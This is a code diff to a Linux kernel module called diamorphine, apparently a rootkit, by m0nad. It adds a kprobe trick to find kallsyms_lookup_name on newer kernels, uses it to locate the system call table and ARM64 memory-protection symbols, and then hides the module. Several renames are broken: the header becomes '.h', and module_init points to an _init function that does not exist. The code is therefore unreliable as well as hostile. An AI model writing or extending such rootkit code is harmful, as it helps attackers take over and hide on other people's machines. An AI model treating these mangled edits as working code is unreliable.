@@ -4,6 +4,7 @@
 #include <linux/dirent.h>
 #include <linux/slab.h>
 #include <linux/version.h> 
+#include <linux/kprobes.h>
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
 #include <asm/uaccess.h>
@@ -29,7 +30,7 @@
 #define __NR_getdents 141
 #endif
 
-#include "diamorphine.h"
+#include ".h"
 
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 unsigned long cr0;
@@ -83,6 +84,16 @@ get_syscall_table_bf(void)
 	}
 	return NULL;
 #endif
+}
+
+static unsigned long get_kallsyms_lookup_name(void) {
+    struct kprobe kp = {
+        .symbol_name = "kallsyms_lookup_name"
+    };
+    if (register_kprobe(&kp) < 0) return 0;
+    unsigned long addr = (unsigned long)kp.addr;
+    unregister_kprobe(&kp);
+    return addr;
 }
 
 struct task_struct *
@@ -383,16 +394,36 @@ unprotect_memory(void)
 static int __init
 diamorphine_init(void)
 {
-	__sys_call_table = get_syscall_table_bf();
-	if (!__sys_call_table)
-		return -1;
 
-#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-	cr0 = read_cr0();
-#elif IS_ENABLED(CONFIG_ARM64)
-	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
-	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
-	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
+    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+    kallsyms_lookup_name_t my_kallsyms_lookup_name = NULL;
+
+ // Resolve kallsyms_lookup_name
+    my_kallsyms_lookup_name = (kallsyms_lookup_name_t)__symbol_get("kallsyms_lookup_name");
+    if (!my_kallsyms_lookup_name) {
+        my_kallsyms_lookup_name = (kallsyms_lookup_name_t)get_kallsyms_lookup_name();
+        if (!my_kallsyms_lookup_name) {
+            printk(KERN_ERR "diamorphine: failed to find kallsyms_lookup_name\n");
+            return -ENOENT;
+        }
+    }
+
+  __sys_call_table = (unsigned long *)my_kallsyms_lookup_name("sys_call_table");
+    if (!__sys_call_table) {
+        printk(KERN_ERR "diamorphine: sys_call_table not found\n");
+        symbol_put(kallsyms_lookup_name);
+        return -ENOENT;
+    }
+
+#if IS_ENABLED(CONFIG_ARM64)
+    update_mapping_prot = (void *)my_kallsyms_lookup_name("update_mapping_prot");
+    start_rodata = (unsigned long)my_kallsyms_lookup_name("__start_rodata");
+    init_begin = (unsigned long)my_kallsyms_lookup_name("__init_begin");
+    if (!update_mapping_prot || !start_rodata || !init_begin) {
+        printk(KERN_ERR "diamorphine: failed to find ARM64 symbols\n");
+        symbol_put(kallsyms_lookup_name);
+        return -ENOENT;
+    }
 #endif
 
 	module_hide();
@@ -420,7 +451,7 @@ diamorphine_init(void)
 }
 
 static void __exit
-diamorphine_cleanup(void)
+_cleanup(void)
 {
 	unprotect_memory();
 
@@ -431,8 +462,8 @@ diamorphine_cleanup(void)
 	protect_memory();
 }
 
-module_init(diamorphine_init);
-module_exit(diamorphine_cleanup);
+module_init(_init);
+module_exit(_cleanup);
 
 MODULE_LICENSE("Dual BSD/GPL");
 MODULE_AUTHOR("m0nad");
